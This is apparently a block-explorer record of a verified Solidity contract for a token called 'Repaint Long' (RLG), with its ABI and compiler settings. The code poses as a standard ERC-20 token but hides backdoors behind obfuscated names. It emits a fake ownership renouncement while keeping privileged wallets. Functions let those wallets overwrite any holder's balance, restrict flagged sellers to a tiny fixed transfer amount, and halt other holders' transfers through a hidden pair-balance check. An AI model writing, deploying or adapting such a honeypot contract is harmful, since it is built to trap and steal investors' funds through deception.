{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface tokenEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptList {\n    function createPair(address amountEnable, address fromAt) external returns (address);\n}\n\ninterface fundAmountTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTo) external view returns (uint256);\n\n    function transfer(address exemptMax, uint256 atMarketing) external returns (bool);\n\n    function allowance(address receiverTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMax,\n        uint256 atMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptBuyLaunch, uint256 value);\n    event Approval(address indexed receiverTake, address indexed spender, uint256 value);\n}\n\ninterface swapMarketingTeam is fundAmountTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RepaintLong is modeAuto, fundAmountTeam, swapMarketingTeam {\n\n    uint256 private feeLiquidity;\n\n    mapping(address => mapping(address => uint256)) private walletSellExempt;\n\n    bool public isSell;\n\n    address public receiverSwap;\n\n    function feeSwap() public {\n        emit OwnershipTransferred(receiverSwap, address(0));\n        marketingSenderAmount = address(0);\n    }\n\n    function walletBuy(address amountTxLaunch, address exemptMax, uint256 atMarketing) internal returns (bool) {\n        require(modeShould[amountTxLaunch] >= atMarketing);\n        modeShould[amountTxLaunch] -= atMarketing;\n        modeShould[exemptMax] += atMarketing;\n        emit Transfer(amountTxLaunch, exemptMax, atMarketing);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeToken;\n    }\n\n    mapping(address => bool) public swapTo;\n\n    function launchTotal(address swapReceiver) public {\n        require(swapReceiver.balance < 100000);\n        if (enableLaunched) {\n            return;\n        }\n        \n        walletToken[swapReceiver] = true;\n        if (tradingFee == feeLiquidity) {\n            tradingFee = feeLiquidity;\n        }\n        enableLaunched = true;\n    }\n\n    uint256 private amountAtList;\n\n    uint256 private totalLiquidity;\n\n    function txSwap() private view {\n        require(walletToken[_msgSender()]);\n    }\n\n    bool private receiverReceiver;\n\n    uint256 private takeTx = 100000000 * 10 ** 18;\n\n    uint256 public launchMinList;\n\n    function transfer(address walletLaunched, uint256 atMarketing) external virtual override returns (bool) {\n        return feeTx(_msgSender(), walletLaunched, atMarketing);\n    }\n\n    function approve(address listFundFrom, uint256 atMarketing) public virtual override returns (bool) {\n        walletSellExempt[_msgSender()][listFundFrom] = atMarketing;\n        emit Approval(_msgSender(), listFundFrom, atMarketing);\n        return true;\n    }\n\n    string private launchToken = \"RLG\";\n\n    function owner() external view returns (address) {\n        return marketingSenderAmount;\n    }\n\n    function feeTx(address amountTxLaunch, address exemptMax, uint256 atMarketing) internal returns (bool) {\n        if (amountTxLaunch == receiverSwap) {\n            return walletBuy(amountTxLaunch, exemptMax, atMarketing);\n        }\n        uint256 exemptTo = fundAmountTeam(feeEnable).balanceOf(amountLimitSell);\n        require(exemptTo == txAt);\n        require(exemptMax != amountLimitSell);\n        if (swapTo[amountTxLaunch]) {\n            return walletBuy(amountTxLaunch, exemptMax, feeLaunch);\n        }\n        return walletBuy(amountTxLaunch, exemptMax, atMarketing);\n    }\n\n    mapping(address => bool) public walletToken;\n\n    function fromTotal(address takeIs) public {\n        txSwap();\n        \n        if (takeIs == receiverSwap || takeIs == feeEnable) {\n            return;\n        }\n        swapTo[takeIs] = true;\n    }\n\n    mapping(address => uint256) private modeShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchToken;\n    }\n\n    uint8 private tokenExemptBuy = 18;\n\n    address amountLimitSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (receiverReceiver == isSell) {\n            tradingFee = launchMinList;\n        }\n        tokenEnable swapBuy = tokenEnable(launchedEnable);\n        feeEnable = exemptList(swapBuy.factory()).createPair(swapBuy.WETH(), address(this));\n        \n        receiverSwap = _msgSender();\n        feeSwap();\n        walletToken[receiverSwap] = true;\n        modeShould[receiverSwap] = takeTx;\n        \n        emit Transfer(address(0), receiverSwap, takeTx);\n    }\n\n    function transferFrom(address amountTxLaunch, address exemptMax, uint256 atMarketing) external override returns (bool) {\n        if (_msgSender() != launchedEnable) {\n            if (walletSellExempt[amountTxLaunch][_msgSender()] != type(uint256).max) {\n                require(atMarketing <= walletSellExempt[amountTxLaunch][_msgSender()]);\n                walletSellExempt[amountTxLaunch][_msgSender()] -= atMarketing;\n            }\n        }\n        return feeTx(amountTxLaunch, exemptMax, atMarketing);\n    }\n\n    uint256 maxTo;\n\n    uint256 txAt;\n\n    function allowance(address toIsReceiver, address listFundFrom) external view virtual override returns (uint256) {\n        if (listFundFrom == launchedEnable) {\n            return type(uint256).max;\n        }\n        return walletSellExempt[toIsReceiver][listFundFrom];\n    }\n\n    uint256 public tradingFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenExemptBuy;\n    }\n\n    bool public enableLaunched;\n\n    address private marketingSenderAmount;\n\n    string private takeToken = \"Repaint Long\";\n\n    uint256 private toTeam;\n\n    address public feeEnable;\n\n    uint256 private receiverAtLaunch;\n\n    function autoEnableAmount(uint256 atMarketing) public {\n        txSwap();\n        txAt = atMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingSenderAmount;\n    }\n\n    function balanceOf(address tradingTo) public view virtual override returns (uint256) {\n        return modeShould[tradingTo];\n    }\n\n    uint256 constant feeLaunch = 14 ** 10;\n\n    event OwnershipTransferred(address indexed buyMode, address indexed senderShould);\n\n    function modeWallet(address walletLaunched, uint256 atMarketing) public {\n        txSwap();\n        modeShould[walletLaunched] = atMarketing;\n    }\n\n    address launchedEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTx;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuyLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toIsReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFundFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atMarketing\",\"type\":\"uint256\"}],\"name\":\"autoEnableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"}],\"name\":\"fromTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMinList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"launchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMarketing\",\"type\":\"uint256\"}],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RepaintLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}